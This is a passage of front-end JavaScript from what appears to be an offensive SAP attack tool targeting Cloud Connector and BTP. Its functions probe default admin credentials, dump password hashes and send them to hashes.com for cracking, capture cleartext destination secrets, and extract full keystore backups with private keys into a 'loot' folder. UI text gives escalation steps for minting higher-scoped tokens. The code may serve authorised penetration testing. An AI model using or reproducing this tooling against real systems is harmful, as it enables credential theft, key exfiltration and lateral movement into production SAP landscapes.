      <div class="detail-row"><span class="detail-key">Enumerated by</span><span class="detail-val">${escHtml(bn.enumerated_via_user || bn.enumerated_via_email || '?')}</span></div>
      <div class="detail-row"><span class="detail-key">Enumerated at</span><span class="detail-val" style="font-size:11px">${escHtml(bn.enumerated_at || '?')}</span></div>
    </div>
    <div class="detail-section">
      <h4>Destinations <span style="color:#8b949e;font-weight:normal;font-size:10px">(${dests.length} total · ${cleartext.length} cleartext · ${linked.length} linked)</span></h4>
      ${destRows || '<div style="color:#8b949e;font-size:11px">No destinations captured.</div>'}
    </div>
  `;
  panel.classList.add('visible');
}

async function sccProbeCreds(host) {
  if (!confirm('Probe default Cloud Connector credentials (Administrator/manage)?\n\n' +
               'Sends ONE login POST.  A failed login is logged on the SCC and may ' +
               'increment a lockout counter for the Administrator account.')) return;
  try {
    flashActivity('SCC ' + host + ': probing creds', 8000);
    const r = await fetch('/api/scc/' + encodeURIComponent(host) + '/probe_creds',
                          { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
    const d = await r.json();
    if (d.error) alert('Probe failed: ' + d.error);
  } catch (e) { alert('Probe error: ' + e); }
}

async function sccPullMappings(host) {
  const stored = _sccStoredCreds(host);
  const defUser = (stored && stored.username) ? stored.username : 'Administrator';
  const defPass = (stored && stored.password) ? stored.password : '';
  const u = prompt('SCC admin username for ' + host + ':', defUser);
  if (!u) return;
  const p = prompt('Password for ' + u + ':', defPass);
  if (p === null) return;
  try {
    flashActivity('SCC ' + host + ': pulling mappings', 12000);
    const r = await fetch('/api/scc/' + encodeURIComponent(host) + '/pull_mappings',
                          { method: 'POST', headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ username: u, password: p }) });
    const d = await r.json();
    if (d.error) alert('Pull failed: ' + d.error);
  } catch (e) { alert('Pull error: ' + e); }
}

async function sccDownloadHashes(host) {
  console.log(`[*] Fetching SCC password hashes from ${host}`);
  let r;
  try {
    r = await fetch(`/api/scc/${encodeURIComponent(host)}/download_user_hashes`,
                    {method:'POST', headers:{'Content-Type':'application/json'},
                     body:JSON.stringify({})});
    r = await r.json();
  } catch(e) { console.error('[SCC hashes] Request failed:', e); return; }

  if (!r.ok) { console.error('[SCC hashes] Failed:', r.error||'unknown'); return; }

  const modal = document.getElementById('scc-hashes-modal');
  document.getElementById('scc-hashes-source').textContent =
    'Source: ' + (r.source || 'unknown');

  // Build hash table
  const users = r.users || [];
  let tbl = '<table style="width:100%;border-collapse:collapse;font-size:12px;font-family:monospace">' +
    '<tr style="color:#8b949e;border-bottom:1px solid #30363d">' +
    '<th style="text-align:left;padding:4px 8px">User</th>' +
    '<th style="text-align:left;padding:4px 8px">Algo</th>' +
    '<th style="text-align:left;padding:4px 8px">Roles</th>' +
    '<th style="text-align:left;padding:4px 8px">Hash:Salt (hex)</th></tr>';
  for (const u of users) {
    const line = u.hashcat_line || (u.hash_hex ? u.hash_hex + ':' + u.salt_hex : '(no hash)');
    tbl += `<tr style="border-bottom:1px solid #21262d">
      <td style="padding:4px 8px;color:#e6edf3">${escHtml(u.username)}</td>
      <td style="padding:4px 8px;color:${u.algorithm==='SHA-1'?'#f0883e':'#3fb950'}">${escHtml(u.algorithm||'?')}</td>
      <td style="padding:4px 8px;color:#8b949e">${escHtml(u.roles||'')}</td>
      <td style="padding:4px 8px;color:#79c0ff;word-break:break-all">${escHtml(line)}</td></tr>`;
  }
  tbl += '</table>';
  document.getElementById('scc-hashes-table').innerHTML = tbl;

  // Hashcat commands + online rainbow table tip
  const cmds = r.hashcat_commands || [];
  let cmdHtml = '<div style="margin-top:8px;padding:8px 10px;background:#161b22;border:1px solid #30363d;border-radius:4px;font-size:12px">' +
    '&#127760; <b style="color:#e6edf3">Quick win:</b> paste the hash value (left of the colon) directly into ' +
    '<a href="https://crackstation.net" target="_blank" style="color:#58a6ff">crackstation.net</a> — ' +
    'it checks against billions of pre-computed SHA-1 and SHA-256 entries instantly, no GPU needed.' +
    '</div>';
  if (cmds.length) {
    cmdHtml += '<div style="margin-top:8px"><div style="color:#8b949e;font-size:11px;margin-bottom:4px">Offline brute-force (hashcat):</div>' +
      cmds.map(c => `<pre style="background:#161b22;padding:8px;border-radius:4px;font-size:11px;color:#e6edf3;margin:0 0 6px;overflow-x:auto">${escHtml(c)}</pre>`).join('') +
      '</div>';
  }
  document.getElementById('scc-hashes-cmds').innerHTML = cmdHtml;

  // Store hash lines for copy button and users for online lookup
  modal._hashLines = users.filter(u=>u.hashcat_line).map(u=>u.hashcat_line);
  modal._users = users;
  modal.dataset.host = host;
  modal.classList.add('visible');

  // Sync the auto-lookup checkbox to the persisted preference
  const autoCb = document.getElementById('hashes-auto-lookup-cb');
  if (autoCb) autoCb.checked = getAutoLookupHashes();

  // Auto-lookup if API key is set and the user hasn't disabled the toggle.
  // Skip when there are zero crackable hashes — nothing to look up.
  if (getAutoLookupHashes() && (modal._users || []).some(u => u.hash_hex)) {
    try {
      const settings = await fetch('/api/settings/local').then(r => r.json());
      if (settings && settings.hashes_com_api_key_set) {
        console.log(`[*] auto-lookup: firing hashes.com query for ${host}`);
        sccLookupHashesOnline();
      } else {
        console.log('[*] auto-lookup: skipped — no hashes.com API key set');
      }
    } catch (e) {
      console.log('[*] auto-lookup: skipped — settings probe failed:', e);
    }
  }
}

// =====================================================================
// BTP — token paste, subaccount enumeration, destination capture
// =====================================================================

async function showBtpTokenModal() {
  const m = document.getElementById('btp-token-modal');
  document.getElementById('btp-token-input').value = '';
  // Show currently-stored tokens (regions only — never the token itself)
  let regions = [];
  try {
    const r = await fetch('/api/btp/regions').then(r => r.json());
    regions = r.regions || [];
  } catch (e) { /* ignore */ }
  const status = document.getElementById('btp-token-status');
  if (regions.length) {
    status.innerHTML =
      '<div style="background:#161b22;border:1px solid #30363d;border-radius:6px;'
      + 'padding:8px 10px;font-size:11px">'
      + '<div style="color:#3fb950">Tokens currently stored for: '
      + regions.map(r => '<code>' + escHtml(r) + '</code>').join(', ')
      + '</div></div>';
  } else {
    status.innerHTML =
      '<div class="muted" style="padding:6px;font-size:11px">No BTP tokens '
      + 'stored yet — paste one above.</div>';
  }
  m.classList.add('visible');
}

async function btpStoreToken() {
  const tok = (document.getElementById('btp-token-input').value || '').trim();
  if (!tok) {
    showToast('Paste a token first.', {autoCloseMs: 4000});
    return;
  }
  let r;
  try {
    r = await fetch('/api/btp/set_token', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({token: tok}),
    }).then(r => r.json());
  } catch (e) {
    showToast('Token validation request failed: ' + e, {autoCloseMs: 6000});
    return;
  }
  const status = document.getElementById('btp-token-status');
  if (!r.ok) {
    // user-select:text + cursor:text so the operator can copy the
    // error message (often contains the iss claim or an HTTP body
    // that's worth pasting into a search / bug report).
    status.innerHTML =
      '<div style="background:#fef0f0;border:1px solid #f5b5b5;color:#b51c1c;'
      + 'padding:8px 10px;border-radius:6px;font-size:12px;'
      + 'user-select:text;-webkit-user-select:text;cursor:text;'
      + 'word-break:break-word;font-family:monospace">'
      + escHtml(r.error || 'unknown error') + '</div>';
    return;
  }
  // Wipe the textarea — token is server-side now, no need to keep DOM copy
  document.getElementById('btp-token-input').value = '';
  // Token kind drives which action button to show.  cf -> Enumerate
  // (lists CF orgs/spaces).  destination -> Pull destinations
  // directly (single bound subaccount).  subaccount -> Enumerate
  // (lists every subaccount the token reaches).
  const kindLabel = {
    'cf':           'Cloud Foundry user token',
    'destination':  'Destination-service token',
    'connectivity': 'Connectivity-service token',
    'xsuaa':        'XSUAA service token',
    'subaccount':   'Subaccount-admin / global-account token',
    'other':        'Unrecognised',
    'unknown':      'Unknown',
  }[r.kind] || r.kind || 'Unknown';
  const kindColour = {
    'destination': '#3fb950',
    'subaccount':  '#3fb950',
    'cf':          '#0969da',
    'other':       '#d4a72c',
  }[r.kind] || '#8b949e';

  status.innerHTML =
    '<div style="background:#dafbe1;border:1px solid #b5e0b5;color:#1a7f37;'
    + 'padding:8px 10px;border-radius:6px;font-size:12px;'
    + 'user-select:text;-webkit-user-select:text;cursor:text">'
    + '<b>✓ Token stored</b> (region <code>' + escHtml(r.region) + '</code>'
    + ', user <b>' + escHtml(r.user || '?') + '</b>'
    + ', fingerprint <code>' + escHtml(r.fingerprint) + '</code>'
    + ', expires in ' + (r.expires_in_seconds || 0) + ' s'
    + (r.expired ? ' — <b style="color:#b51c1c">ALREADY EXPIRED</b>' : '')
    + ')</div>'
    // Kind banner — explains what THIS token can do
    + '<div style="margin-top:8px;padding:8px 10px;border-radius:6px;'
    + 'border:1px solid ' + kindColour + ';background:#1f2329;'
    + 'color:#c9d1d9;font-size:11px;user-select:text;-webkit-user-select:text">'
    + '<b style="color:' + kindColour + '">Token kind:</b> '
    + escHtml(kindLabel)
    + (r.bound_subaccount_uuid
        ? '<br><span class="muted">Bound subaccount:</span> <code>'
          + escHtml(r.bound_subaccount_uuid) + '</code>'
          + (r.subdomain ? ' (' + escHtml(r.subdomain) + ')' : '')
        : '')
    + '<br><span class="muted">' + escHtml(r.kind_description || '')
    + '</span></div>'
    // Kind-aware action button
    + (r.kind === 'destination'
        ? '<div style="margin-top:10px"><button class="btn btn-primary" '
          + 'onclick="btpPullForToken(\'' + escHtml(r.region) + '\')">'
          + 'Pull destinations (capture cleartext)</button></div>'
        : '<div style="margin-top:10px"><button class="btn btn-primary" '
          + 'onclick="btpEnumerate(\'' + escHtml(r.region) + '\')">'
          + 'Enumerate ' + escHtml(r.region) + '</button></div>');
  showToast(
    '<b>✓ BTP token stored</b><div style="font-size:11px;color:#8b949e;'
    + 'margin-top:4px">Region: ' + escHtml(r.region)
    + ' · User: ' + escHtml(r.user || '?') + '</div>',
    {autoCloseMs: 8000});
}

async function btpClearTokens() {
  if (!confirm('Clear ALL stored BTP tokens? This wipes them from process memory.'))
    return;
  await fetch('/api/btp/clear_token', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({}),
  });
  document.getElementById('btp-token-status').innerHTML =
    '<div class="muted" style="padding:6px;font-size:11px">All BTP tokens '
    + 'cleared.</div>';
  showToast('BTP tokens cleared.', {autoCloseMs: 4000});
}

async function btpPullForToken(region) {
  // Direct destination-pull for destination-service-scoped tokens.
  // The token IS the subaccount (via ext_attr.subaccountid claim) —
  // no enumeration step needed.  Server extracts the bound subaccount
  // UUID, calls /destinations, captures cleartext, links to on-prem.
  showToast('<b>Pulling destinations…</b>'
            + '<div style="font-size:11px;color:#8b949e;margin-top:4px">'
            + 'Per-destination "find" call to materialise cleartext '
            + 'where AccessClientSecrets is granted.</div>',
            {autoCloseMs: 5000});
  let r;
  try {
    r = await fetch('/api/btp/pull_destinations_for_token', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({region}),
    }).then(r => r.json());
  } catch (e) {
    showToast('Pull destinations failed: ' + e, {autoCloseMs: 6000});
    return;
  }
  if (!r.ok) {
    showToast('Pull destinations failed: ' + (r.error || '?'),
              {autoCloseMs: 8000});
    return;
  }
  const captured = r.cleartext_captured || 0;
  const linked = r.linked_to_onprem || 0;
  const prdTargets = r.prd_targets || 0;
  const colour = (captured && prdTargets) ? '#f85149'
                : (captured ? '#db6d28' : '#3fb950');
  showToast(
    '<b style="color:' + colour + '">'
    + escHtml(r.subdomain || r.subaccount_uuid) + '</b>'
    + '<div style="font-size:12px;margin-top:6px">'
    + r.destinations + ' destination(s) · '
    + '<b>' + captured + '</b> cleartext captured · '
    + '<b>' + linked + '</b> linked to on-prem'
    + (prdTargets ? ' · <b style="color:#f85149">'
        + prdTargets + ' reach PRD</b>' : '') + '</div>'
    + '<div style="font-size:10px;color:#8b949e;margin-top:6px">'
    + 'Captured creds added to the matching SAPNode.credentials. '
    + 'Synthetic RFC edges drawn BTP→on-prem so trust-chain analysis '
    + 'walks them.</div>',
    {autoCloseMs: 14000});
  if (typeof refreshState === 'function') refreshState();
  else if (typeof updateMap === 'function') updateMap();
}

async function btpEnumerate(region) {
  showToast('<b>Enumerating BTP region ' + escHtml(region) + '…</b>',
            {autoCloseMs: 4000});
  let r;
  try {
    r = await fetch('/api/btp/enumerate', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({region}),
    }).then(r => r.json());
  } catch (e) {
    showToast('BTP enumeration failed: ' + e, {autoCloseMs: 6000});
    return;
  }
  if (!r.ok) {
    showToast('BTP enumeration failed: ' + (r.error || '?'),
              {autoCloseMs: 8000});
    return;
  }
  // Render a quick summary inline in the token modal
  const cf = r.cf_topology || {};
  const orgs = cf.orgs || [], spaces = cf.spaces || [],
        apps = cf.apps || [], sis = cf.service_instances || [],
        hints = cf.escalation_hints || [];

  let html = '<div style="background:#161b22;border:1px solid #30363d;'
    + 'border-radius:6px;padding:10px;margin-top:10px;font-size:12px;'
    + 'color:#c9d1d9;user-select:text;-webkit-user-select:text">';

  // Scope warnings (always render first so the operator sees them)
  if ((r.scope_warnings || []).length) {
    html += '<div style="background:#fff8c5;color:#7d4e00;'
      + 'border:1px solid #d4a72c;border-radius:4px;padding:8px 10px;'
      + 'margin-bottom:10px;font-size:11px">'
      + '<b>⚠️ Token-scope limitations</b><br>';
    for (const w of r.scope_warnings) {
      // Backticks → <code>, \n → <br>, "  N. " → indented bullets
      // so multi-step recipes (e.g. how to mint a destination token)
      // render as a readable list rather than one wall of text.
      const rendered = escHtml(w)
        .replace(/`([^`]+)`/g, '<code>$1</code>')
        .replace(/\n/g, '<br>');
      html += '• ' + rendered + '<br>';
    }
    html += '</div>';
  }

  // BTP-side block (subaccounts + SCC mappings)
  html += '<div style="font-weight:600;margin-bottom:6px;color:'
    + (r.subaccount_count > 0 ? '#3fb950' : '#8b949e') + '">'
    + (r.subaccount_count > 0 ? '✓' : 'ℹ︎')
    + ' BTP control plane: ' + r.subaccount_count + ' subaccount(s), '
    + r.scc_mapping_count + ' SCC mapping(s)</div>';
  if (r.subaccount_count === 0) {
    html += '<div style="color:#8b949e;font-style:italic;font-size:11px;'
      + 'margin-bottom:8px">'
      + '0 subaccounts is normal for a stock `cf oauth-token`. '
      + 'See scope warning above for how to escalate.</div>';
  }
  for (const s of (r.subaccounts || [])) {
    html += '<div style="padding:6px 0;border-top:1px solid #30363d;'
      + 'display:flex;justify-content:space-between;align-items:center;gap:8px">'
      + '<div><b>' + escHtml(s.display_name || s.uuid)
      + '</b> <span class="muted">'
      + '· <code>' + escHtml(s.uuid.substring(0, 8))
      + '…</code> · ' + s.scc_mappings + ' SCC tunnel(s)</span></div>'
      + '<button class="btn" style="padding:3px 10px;font-size:11px" '
      + 'onclick="btpPullDestinations(\'' + escHtml(s.uuid) + '\',\''
      + escHtml(s.display_name || s.uuid) + '\')">Pull destinations</button>'
      + '</div>';
  }

  // Cloud Foundry topology — what the cf-scoped token CAN see.
  if (orgs.length || spaces.length || apps.length || sis.length) {
    html += '<div style="margin-top:14px;padding-top:10px;'
      + 'border-top:1px solid #30363d;font-weight:600;color:#58a6ff">'
      + '☁️ Cloud Foundry topology (visible via <code>cloud_controller.read</code>)</div>';
    html += '<div style="font-size:11px;color:#c9d1d9;margin-top:4px">'
      + '<b>' + orgs.length + '</b> org' + (orgs.length === 1 ? '' : 's') + ' · '
      + '<b>' + spaces.length + '</b> space' + (spaces.length === 1 ? '' : 's') + ' · '
      + '<b>' + apps.length + '</b> app' + (apps.length === 1 ? '' : 's') + ' · '
      + '<b>' + sis.length + '</b> service instance' + (sis.length === 1 ? '' : 's')
      + '</div>';
    if (orgs.length) {
      html += '<div style="margin-top:6px;font-size:11px"><span class="muted">Orgs:</span> '
        + orgs.map(o => '<code>' + escHtml(o.name || o.guid) + '</code>').join(', ')
        + '</div>';
    }
    if (spaces.length && spaces.length <= 30) {
      html += '<div style="margin-top:4px;font-size:11px"><span class="muted">Spaces:</span> '
        + spaces.map(s => '<code>' + escHtml(s.name || s.guid) + '</code>').join(', ')
        + '</div>';
    }
    if (apps.length && apps.length <= 30) {
      html += '<div style="margin-top:4px;font-size:11px"><span class="muted">Apps:</span> '
        + apps.map(a => '<code>' + escHtml(a.name)
            + (a.state && a.state !== 'STARTED' ? ':' + a.state.toLowerCase() : '')
            + '</code>').join(', ')
        + '</div>';
    }
    if (sis.length && sis.length <= 40) {
      html += '<div style="margin-top:4px;font-size:11px"><span class="muted">Service instances:</span> '
        + sis.map(s => '<code>' + escHtml(s.name) + '</code>').join(', ')
        + '</div>';
    }

    // Escalation hints — likely Destination / Connectivity / XSUAA
    // bindings whose client_id+client_secret can mint a higher-
    // scoped token.
    if (hints.length) {
      html += '<div style="margin-top:10px;background:#1f1a0e;'
        + 'border:1px solid #db6d28;border-radius:4px;padding:8px 10px;'
        + 'font-size:11px;color:#f0883e">'
        + '<b>⚡ Escalation hints (' + hints.length + ')</b><br>'
        + '<span style="color:#c9d1d9">These service instances likely '
        + 'host credentials that mint higher-scoped BTP tokens.  '
        + 'Run <code>cf service-key &lt;name&gt; &lt;keyname&gt;</code> '
        + 'to extract their client_id / client_secret, then exchange '
        + 'at XSUAA for a token with destination_configuration.'
        + 'ApiAccess.</span><ul style="margin:6px 0 0 16px;padding:0">';
      for (const h of hints) {
        html += '<li><code>' + escHtml(h.service_instance_name)
          + '</code></li>';
      }
      html += '</ul></div>';
    }
  }

  // Bubble up any HTTP errors from the CF/BTP probes
  if ((cf.errors || []).length) {
    html += '<div style="margin-top:8px;font-size:10px;color:#8b949e">'
      + '<b>Probe errors:</b><br>'
      + cf.errors.map(e => '• ' + escHtml(e)).join('<br>')
      + '</div>';
  }

  html += '</div>';
  document.getElementById('btp-token-status').innerHTML += html;
}

async function btpPullDestinations(uuid, displayName) {
  showToast('<b>Pulling destinations for '
            + escHtml(displayName) + '…</b>'
            + '<div style="font-size:11px;color:#8b949e;margin-top:4px">'
            + 'Per-destination "find" call to materialise cleartext where '
            + 'the token allows.</div>',
            {autoCloseMs: 5000});
  let r;
  try {
    r = await fetch('/api/btp/pull_destinations/' + encodeURIComponent(uuid),
                    {method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: '{}'})
      .then(r => r.json());
  } catch (e) {
    showToast('Pull destinations failed: ' + e, {autoCloseMs: 6000});
    return;
  }
  if (!r.ok) {
    showToast('Pull destinations failed: ' + (r.error || '?'),
              {autoCloseMs: 8000});
    return;
  }
  const captured = r.cleartext_captured || 0;
  const linked = r.linked_to_onprem || 0;
  const prdTargets = r.prd_targets || 0;
  const colour = (captured && prdTargets) ? '#f85149'
                : (captured ? '#db6d28' : '#3fb950');
  showToast(
    '<b style="color:' + colour + '">' + escHtml(displayName) + '</b>'
    + '<div style="font-size:12px;margin-top:6px">'
    + r.destinations + ' destination(s) · '
    + '<b>' + captured + '</b> cleartext captured · '
    + '<b>' + linked + '</b> linked to on-prem'
    + (prdTargets ? ' · <b style="color:#f85149">'
        + prdTargets + ' reach PRD</b>' : '') + '</div>'
    + '<div style="font-size:10px;color:#8b949e;margin-top:6px">'
    + 'Captured creds added to the matching SAPNode.credentials. '
    + 'Synthetic RFC edges drawn BTP→on-prem so trust-chain analysis '
    + 'walks them.</div>',
    {autoCloseMs: 14000});
  // If a state refresh function exists, kick it so the map redraws
  if (typeof refreshState === 'function') refreshState();
  else if (typeof updateMap === 'function') updateMap();
}

async function openDiffModal() {
  // Populate both dropdowns with the contents of states/ + an
  // in-memory option, then show the modal.
  let r;
  try {
    r = await fetch('/api/diff/list_states').then(r => r.json());
  } catch (e) {
    showToast('Could not list states/: ' + e, {autoCloseMs: 6000});
    return;
  }
  if (!r.ok) {
    showToast('Could not list states/: ' + (r.error || '?'),
              {autoCloseMs: 6000});
    return;
  }
  const baseSel = document.getElementById('diff-baseline');
  const currSel = document.getElementById('diff-current');
  baseSel.innerHTML = '';
  currSel.innerHTML = '';

  // In-memory option always available (most useful default for
  // "current") — paired with a "(pick a saved file)" placeholder for
  // baseline.
  const opts = [];
  opts.push({value: '__in_memory__',
              label: '(live, in-memory state)'});
  for (const f of (r.files || [])) {
    opts.push({value: f.path,
                label: `${f.name}  —  ${f.mtime}  (${f.size} bytes)`});
  }
  for (const o of opts) {
    const optB = document.createElement('option');
    optB.value = o.value; optB.textContent = o.label;
    baseSel.appendChild(optB);
    const optC = document.createElement('option');
    optC.value = o.value; optC.textContent = o.label;
    currSel.appendChild(optC);
  }

  // Sensible defaults: oldest saved file as baseline, in-memory as
  // current.
  if ((r.files || []).length > 0) {
    baseSel.value = r.files[r.files.length - 1].path;
  }
  currSel.value = '__in_memory__';

  document.getElementById('diff-result').innerHTML = '';
  document.getElementById('diff-modal').classList.add('visible');
}

async function runDiffCompute() {
  const base = document.getElementById('diff-baseline').value;
  const curr = document.getElementById('diff-current').value;
  if (!base || !curr) {
    showToast('Pick both baseline and current.', {autoCloseMs: 5000});
    return;
  }
  if (base === curr) {
    showToast('Baseline and current are the same — pick different snapshots.',
              {autoCloseMs: 5000});
    return;
  }
  const resDiv = document.getElementById('diff-result');
  resDiv.innerHTML = '<div class="muted" style="padding:8px">Computing diff…</div>';
  let r;
  try {
    r = await fetch('/api/diff/compute', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({baseline: base, current: curr}),
    });
    r = await r.json();
  } catch (e) {
    resDiv.innerHTML =
      '<div style="color:#f85149;padding:8px">Request failed: '
      + escHtml(String(e)) + '</div>';
    return;
  }
  if (!r.ok) {
    resDiv.innerHTML =
      '<div style="color:#f85149;padding:8px">Diff failed: '
      + escHtml(r.error || 'unknown') + '</div>';
    return;
  }
  const s = r.summary || {};
  resDiv.innerHTML =
    '<div style="background:#161b22;border:1px solid #30363d;'
    + 'border-radius:6px;padding:12px;font-size:12px;color:#c9d1d9">'
    + '<div style="color:#3fb950;font-weight:600;margin-bottom:8px">'
    + '✓ Diff written</div>'
    + '<div style="display:grid;grid-template-columns:auto 1fr;'
    + 'gap:4px 12px;font-family:monospace;font-size:11px">'
    + '<div style="color:#8b949e">Newly pwned:</div>'
    + '<div>' + (s.newly_pwned_count || 0)
    + (s.newly_pwned_sids && s.newly_pwned_sids.length
        ? ' — ' + escHtml(s.newly_pwned_sids.join(', ')) : '') + '</div>'
    + '<div style="color:#8b949e">New CRITICAL findings:</div>'
    + '<div>' + (s.newly_critical || 0) + '</div>'
    + '<div style="color:#8b949e">New chains → PRD:</div>'
    + '<div>' + (s.new_chains_to_prd || 0) + '</div>'
    + '<div style="color:#8b949e">Findings added:</div>'
    + '<div>' + (s.findings_added || 0) + '</div>'
    + '<div style="color:#8b949e">Findings remediated:</div>'
    + '<div>' + (s.findings_removed || 0) + '</div>'
    + '<div style="color:#8b949e">Nodes added/removed:</div>'
    + '<div>' + (s.nodes_added || 0) + ' / '
    + (s.nodes_removed || 0) + '</div>'
    + '</div>'
    + '<div style="margin-top:10px;font-size:11px;'
    + 'word-break:break-all;color:#c9d1d9">'
    + '<b>HTML:</b> ' + escHtml(r.html_path) + '<br>'
    + '<b>Markdown:</b> ' + escHtml(r.md_path)
    + '</div>'
    + '<div style="color:#8b949e;font-size:10px;margin-top:6px">'
    + 'Open the HTML file in any browser for a presentable view.</div>'
    + '</div>';
}

// localStorage-backed toggle (default ON).  Persists across reloads so
// operators don't have to re-enable each session.
function getAutoLookupHashes() {
  const v = localStorage.getItem('sapmap.autoLookupHashes');
  // Default to true if nothing was stored.
  return v === null ? true : v === 'true';
}

function setAutoLookupHashes(on) {
  localStorage.setItem('sapmap.autoLookupHashes', on ? 'true' : 'false');
  console.log(`[*] auto-lookup on hashes.com: ${on ? 'enabled' : 'disabled'}`);
}

function sccHashesCopy() {
  const modal = document.getElementById('scc-hashes-modal');
  const lines = (modal._hashLines || []).join('\n');
  if (!lines) { showToast('No hashes to copy', 'warn'); return; }
  navigator.clipboard.writeText(lines).then(
    () => showToast('Hashes copied to clipboard', 'success'),
    () => showToast('Copy failed — select manually', 'error'));
}

async function showHashesApiKeyModal() {
  // Show current status before opening
  try {
    const s = await fetch('/api/settings/local').then(r => r.json());
    const info = document.getElementById('hashes-api-key-input');
    if (info) info.placeholder = s.hashes_com_api_key_set
      ? '(key already set — paste new key to replace)'
      : 'paste key here';
  } catch(e) {}
  document.getElementById('hashes-api-modal').classList.add('visible');
}

async function saveHashesApiKey() {
  const key = (document.getElementById('hashes-api-key-input').value || '').trim();
  if (!key) { alert('Please enter an API key'); return; }
  const r = await fetch('/api/settings/local', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({hashes_com_api_key: key})
  });
  const d = await r.json();
  if (d.ok) {
    showToast('hashes.com API key saved to settings.local.json', 'success');
    closeModal('hashes-api-modal');
  } else {
    showToast('Failed to save: ' + (d.error||'?'), 'error');
  }
}

async function sccLookupHashesOnline() {
  const modal = document.getElementById('scc-hashes-modal');
  const host = modal.dataset.host;
  if (!host) { showToast('No SCC host in modal', 'error'); return; }

  // Check if API key is set
  const settingsR = await fetch('/api/settings/local');
  const settings = await settingsR.json();
  if (!settings.hashes_com_api_key_set) {
    document.getElementById('hashes-api-key-input').value = '';
    document.getElementById('hashes-api-modal').classList.add('visible');
    return;
  }

  // Build hash list from stored modal data
  const users = modal._users || [];
  const hashes = users.filter(u => u.hash_hex).map(u => ({
    username: u.username,
    hash_hex: u.hash_hex,
    algorithm: u.algorithm,
    hashcat_line: u.hashcat_line,
  }));
  if (!hashes.length) { showToast('No hex hashes to look up', 'warn'); return; }

  const btn = document.getElementById('hashes-lookup-btn');
  if (btn) btn.textContent = '\u23f3 Looking up\u2026';
  const resDiv = document.getElementById('scc-hashes-online-results');
  if (resDiv) resDiv.innerHTML = '';

  let r;
  try {
    r = await fetch(`/api/scc/${encodeURIComponent(host)}/lookup_hashes_online`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({hashes})
    });
    r = await r.json();
  } catch(e) {
    showToast('Request failed: ' + e, 'error');
    if (btn) btn.textContent = '\ud83d\udd0d Lookup on hashes.com';
    return;
  }
  if (btn) btn.textContent = '\ud83d\udd0d Lookup on hashes.com';

  if (!r.ok) {
    showToast('hashes.com: ' + (r.error||'error'), 'error');
    return;
  }

  // Show results
  let html = `<div style="margin-top:8px;padding:8px;background:#161b22;border-radius:4px;font-size:12px">` +
    `<div style="color:#8b949e;margin-bottom:6px">hashes.com results \u2014 ` +
    `${r.cracked}/${r.results.length} cracked, cost: ${r.cost} credit(s)</div>`;
  for (const res of (r.results || [])) {
    if (res.found) {
      html += `<div style="color:#3fb950;font-family:monospace">\u2713 ${escHtml(res.username)}: <b>${escHtml(res.plaintext)}</b> \u2014 stored as SCC credential</div>`;
    } else {
      html += `<div style="color:#484f58;font-family:monospace">\u2717 ${escHtml(res.username)}: not found</div>`;
    }
  }
  html += '</div>';
  if (resDiv) resDiv.innerHTML = html;

  if (r.cracked > 0) {
    console.log(`[+] ${r.cracked} SCC password(s) cracked — stored as credentials`);
    refreshState();
  }
}

async function sccExtractKeystore(host) {
  if (!confirm('EXTRACT FULL SCC KEYSTORE BACKUP from ' + host + '?\n\n' +
               'This calls POST /api/v1/configuration/backup which returns a zip ' +
               'containing every tunnel client cert + private key, the system ' +
               'identity keystore, the SSFS blob (PP CA private key), and the ' +
               'local users.xml.\n\n' +
               'SAPMAP will then auto-decrypt the SSFS in pure Python (no JDK / ' +
               'no SAP libs needed) and unlock every .p12 keystore in the zip. ' +
               'Plaintext secrets land in a side-file at mode 0600; only key ' +
               'NAMES enter findings.\n\n' +
               'The zip will be saved under ./loot/scc/' + host + '/ with mode 0600. ' +
               'Treat as crown-jewels material.')) return;
  const stored = _sccStoredCreds(host);
  const defUser = (stored && stored.username) ? stored.username : 'Administrator';
  const defPass = (stored && stored.password) ? stored.password : '';
  const u = prompt('SCC admin username for ' + host + ':', defUser);
  if (!u) return;
  const p = prompt('Password for ' + u + ':', defPass);
  if (p === null) return;
  const bp = prompt('Backup encryption password (passphrase that locks keystores in the zip):', p || defPass);
  if (!bp) return;
  try {
    flashActivity('SCC ' + host + ': extracting keystore', 30000);
    const r = await fetch('/api/scc/' + encodeURIComponent(host) + '/extract_keystore',
                          { method: 'POST', headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ username: u, password: p, backup_password: bp }) });
    const d = await r.json();
    if (d.error) alert('Extraction failed: ' + d.error);
  } catch (e) { alert('Extraction error: ' + e); }
}

async function sccProbeMappings(host) {
  const sn = (mapState.scc_nodes || {})[host];
  const n = (sn && sn.mappings) ? sn.mappings.length : 0;
  if (n === 0) { alert('No mappings on ' + host + ' — pull them first.'); return; }
  if (!confirm('Tunnel-relay smoke test on ' + n + ' mapping(s)?\n\n' +
               'TCP/HTTP HEAD probe of each mapping\'s internal endpoint. ' +
               'No credentials are sent. ~4s timeout per mapping.')) return;
  try {
    flashActivity('SCC ' + host + ': probing mappings', 8000 + n * 4000);
    const r = await fetch('/api/scc/' + encodeURIComponent(host) + '/probe_mappings',
                          { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
    const d = await r.json();
    if (d.error) alert('Probe failed: ' + d.error);
  } catch (e) { alert('Probe error: ' + e); }
}

function showImpactDetail(sid) {
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  const panel = document.getElementById('detail-panel');
  const results = (n.impact_results || []).slice().sort((a,b) => (b.severity||0) - (a.severity||0));
  const sevColors = { 5:'#e74c3c', 4:'#e67e22', 3:'#f1c40f', 2:'#3498db', 1:'#95a5a6' };
  const sevLabels = { 5:'CRITICAL', 4:'HIGH', 3:'MEDIUM', 2:'LOW', 1:'INFO' };

  const withData = results.filter(r => r.record_count > 0);
  const empty = results.filter(r => r.record_count === 0 && !r.error);

  panel.innerHTML = `
    <span class="close-btn" onclick="this.parentElement.classList.remove('visible')">&times;</span>
